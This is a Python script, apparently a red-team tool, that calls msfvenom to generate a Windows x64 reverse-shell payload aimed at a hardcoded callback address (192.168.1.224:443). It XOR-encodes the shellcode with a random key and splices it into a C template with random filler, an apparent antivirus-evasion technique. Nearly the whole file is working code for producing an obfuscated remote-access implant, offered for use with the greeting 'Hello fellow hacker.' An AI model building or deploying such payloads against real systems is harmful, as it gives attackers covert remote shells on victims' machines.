#!/usr/bin/python

# This script requires msfvenom
import socket
import os
import random
import string

tmp_file_name = "msf-venom-sample.bin.tmp"

def gen_random_string(length):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def gen_msfvenom_sample(lhost: str, lport: int, payload: str, output_file: str):
    os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw  > {output_file}") # --encrypt aes256 --encrypt-key {gen_random_string(32)} --encrypt-iv {gen_random_string(16)}
    return

def encode_msfvenom_sample(input_file:str, key:str, output_file:str):
    new_contents = bytearray()
    with open(input_file, "rb") as file:
        contents = list(file.read())
        key_bytes = list(key.encode())
        for i in range(len(contents)):
            new_contents.append(contents[i] ^ key_bytes[i % len(key_bytes)])
    tmp_contents = ""
    for byte in new_contents:
        tmp_contents += "\\x" + hex(byte)[2:]
    with open(output_file, "w") as file:
        file.write(tmp_contents)


def gen_create_helper(input_file:str,output_file:str, key:str):
    tmp_frame_file = gen_random_string(8)
    os.system(f"cp frame.c {tmp_frame_file}")
    with open(input_file, "r") as file1:
        new_contents = ""
        with open(tmp_frame_file, "r") as file2:
            contents1 = file1.read()
            contents2 = file2.read()
            new_contents = contents2.replace("// PYTHON_REPLACE_ME_HERE_2", "char buf[] = \"" + contents1 + "\";")
            new_contents = new_contents.replace("// PYTHON_REPLACE_ME_HERE_1", gen_random_string(32))
            new_contents = new_contents.replace("// PYTHON_REPLACE_ME_HERE_3", "\"" + key + "\";")
        with open(tmp_frame_file, "w") as file3:
            file3.write(new_contents)
    os.system(f"mv {tmp_frame_file} {output_file}")
    return

def print_welcome():
    print("Hello fellow hacker.")


def check_addr(addr: str):
    try:
        socket.inet_aton(addr)
        return True
    except socket.error:
        return False


if __name__ == "__main__":
    tmp_file_name = "msf-venom-sample.bin"
    # lhost = input("What is the LHOST: ")
    # if not check_addr(lhost):
    #     print("Not valid ip address")
    #     exit(-1)
    # lport = input("What is the LPORT: ")
    # if not lport.isnumeric() and int(lport) >= 0 and int(lport) <= 65535:
    #     print("Not valid port number")
    #     exit(-2)
    # payload = input("What is the msfvenom payload you want to use? ")
    # if not payload.startswith("windows"):
    #     print("Only windows payloads are supported at this time.")
    #     print("Payload must start with windows/. Ex: windows/meterpreter/reverse_tcp")
    #     exit(-3)
    # output_file = input("Enter output file name: ")
    lhost = "192.168.1.224"
    lport = 443
    payload = "windows/x64/shell/reverse_tcp"
    output_file = "poc.c"
    key = gen_random_string(16)
    gen_msfvenom_sample(lhost, int(lport), payload, tmp_file_name)
    encode_msfvenom_sample(tmp_file_name,key,tmp_file_name)
    gen_create_helper(tmp_file_name, output_file,key)
    os.system(f"rm {tmp_file_name}")
    

